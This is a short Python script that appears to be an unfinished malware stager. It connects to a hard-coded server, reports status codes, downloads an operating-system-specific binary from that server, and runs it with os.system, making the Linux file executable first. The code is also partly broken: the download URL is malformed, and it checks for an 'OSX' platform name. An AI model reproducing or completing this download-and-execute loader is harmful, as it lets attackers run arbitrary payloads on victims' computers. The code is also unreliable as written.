#!/usr/bin/python3
import platform,time,os,socket,subprocess,base64,hashlib, urllib, requests
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
"""
def connect2():
    ip = input("[*] Enter the IP address of the Server: ")
    port = input("[*] Enter the port listening of the server: ")
    try:
        send_any(ip, port)
    except Exception as e:
        print("[-] An error has occured\n\n", e, "returning to main menu....", "red")
        time.sleep(1)
        main(ip, port)"""

def main(ip, port):
    s.connect((ip, port))
    s.sendall("84".encode())
    print("under construcition...")
    os_name = platform.system()
    time.sleep(2)
    url = 'http://'+ip+"80/"+os_name
    try:
        if os_name == 'Linux':
        
            r = requests.get(url, allow_redirects=True)
            open('linux', 'wb').write(r.content)
            s.sendall("01".encode())
        if os_name == 'Windows':

            r = requests.get(url, allow_redirects=True)
            open('system.exe', 'wb').write(r.content)
            s.sendall("02".encode())
        if os_name == 'OSX':
        
            r = requests.get(url, allow_redirects=True)
            open('osx.dmg', 'wb').write(r.content)
            s.sendall("03".encode())
    except:
        s.send("405".encode())
    s.send("10".encode())
    try:
        if os_name == "Windows":
            os.system("system.exe")
        if os_name == 'Linux':
            os.system("chmod +x ./linux && ./linux")
        if os_name == 'OSX':
            s.send("400".encode())
            exit()
    except:
        s.send("401".encode())    
    

 


    



        
        
            
   

if __name__ == '__main__':

    
    ip = "127.0.0.1"
    port = 4443
    for x in range(10):
	    try:
	    	main(ip, port)
	    	break
	    except:
	    	time.sleep(5)
